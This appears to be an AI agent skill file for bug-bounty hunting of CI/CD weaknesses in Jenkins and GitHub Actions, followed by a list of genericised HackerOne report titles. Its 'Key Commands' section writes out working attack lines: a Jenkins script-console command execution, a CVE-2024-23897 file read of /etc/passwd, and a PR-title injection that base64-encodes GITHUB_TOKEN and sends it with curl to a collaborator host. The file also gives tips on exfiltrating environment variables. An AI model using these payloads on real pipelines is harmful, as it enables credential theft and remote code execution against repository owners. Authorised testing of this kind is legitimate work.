---
name: hunt-cicd
description: CI/CD pipeline security — Jenkins script console + CVE-2024-23897 args4j file read, the two sink classes (${{ }} template expansion, env var exfil — never cat $VAR), pwnrequest / pull_request_target, self-hosted runner poisoning, OIDC trust-policy abuse, add-mask bypass, tfstate secrets, zizmor/actionlint static analysis. Use when CI/CD platforms or .github/workflows are in scope. Trigger keywords: CI/CD, Jenkins, GitHub Actions, pull_request_target, pipeline, OIDC, runner, gitlab-ci.
---

# CI/CD Pipeline Security — Deep Hunting

## THE GATE
Jenkins script console → credential store dump; **CVE-2024-23897 pre-auth CLI file read** via args4j `@`-expansion (`@/etc/passwd` in `-http connect-node`) → read `secret.key`+`master.key` → forge admin.

## The Two Sink Classes (90% of false PoCs die here)
1. `${{ }}` template expansion into shell `run:` — inject newlines/backticks/`$(...)` via PR title/branch/body.
2. Env vars read inside shell — exfil with `printenv`/`/proc/self/environ`, **never `cat $VAR`** (cat tries to open a file *named* by the token).

## Attack Vectors
- **Pwnrequest** requires `pull_request_target` (write token on fork PRs) + checkout of `head.sha` (dangerous checkout) + untrusted data reaching a sink.
- **Poisoned checkout** via `preinstall` hooks/Makefiles.
- **Self-hosted runner poisoning** on public repos (fork PR runs on org host, IMDS reachable).
- **OIDC trust-policy abuse**: missing/`repo:ORG/*` wildcard `sub` condition lets any org workflow assume a privileged cloud role.
- **`::add-mask::`** only hides exact values — derived/base64 forms leak in public logs; `upload-artifact` doesn't redact.
- **Terraform state** in public buckets; `trufflehog docker --only-verified` for image-layer secrets.

## Key Commands
```
curl -X POST /scriptText --data-urlencode 'script=println "id".execute().text'
java -jar jenkins-cli.jar -s https://T/ -http connect-node "@/etc/passwd"
PR title:  a"; printenv GITHUB_TOKEN | base64 | tr -d '\n' | { read T; curl "https://x.<COLLAB>/?t=$T"; }; echo "
zizmor .github/workflows/
gh api repos/O/R/actions/runs/$id/logs → grep 'AKIA|ghp_|eyJ'
```

## Fingerprinting
`X-Jenkins`/`X-Hudson` headers; candidate scan for `pull_request_target|workflow_run` + `${{ github.event` + `self-hosted`; `actionlint`/`zizmor`.

## Validation
scriptText must return `uid=…(jenkins)`; CVE-23897 must echo real `/etc/passwd` line; blind injection needs Collaborator callback with runner source IP; OIDC proven via `sts get-caller-identity` returning the role ARN; tfstate must yield a *live* credential.

## Common Mistakes
Login page reported as unauth console; `pull_request_target` present but no data-flow to sink; `.tfstate` 200 with only resource metadata; unverified trufflehog hits.

## FIELD DATA — mined from HackerOne disclosed reports (10k-report corpus)

### Class: cicd — 294 disclosed H1 reports (121 High/Critical)

**Parameters seen in real findings** (recurring; test each on every endpoint):

- `scope`
- `search`
- `authenticity_token`
- `name`
- `group_id`
- `repository_ref`
- `state`
- `snippets`
- `file.path`
- `client_id`

**Representative finding shapes** (real report titles, genericized — use as test-case ideas, not templates):

- **[critical] RCE when removing metadata with ExifTool** (Code Injection)
  - Signal: ### Summary When uploading image files, GitLab Workhorse passes any files with the extensions [jpg|jpeg|tiff](https://gitlab.com/gitlab-org/gitlab/-/blob/v13.10.2-ee/workhorse/inte
- **[critical] Project Template functionality can be used to copy private project data, such as repository, confidential issues, snippets, and merge requests** (Privilege Escalation)
  - Signal: I've found a three minor vulnerabilities which, when combined, allow an attacker to copy private repositories, confidential issues, private snippets, and then some. I'll go through
- **[critical] Remote Command Execution via Github import** (Command Injection - Generic)
  - Signal: ### Summary This is very similar to https://about.gitlab.com/releases/2022/08/22/critical-security-release-gitlab-15-3-1-released/#Remote%20Command%20Execution%20via%20Github%20imp
- **[critical] RCE via the DecompressedArchiveSizeValidator and Project BulkImports (behind feature flag)** (Command Injection - Generic)
  - Signal: ### Summary The `DecompressedArchiveSizeValidator` is used to check the size of a archive before extracting it: https://gitlab.com/gitlab-org/gitlab/-/blob/v15.1.0-ee/lib/gitlab/im

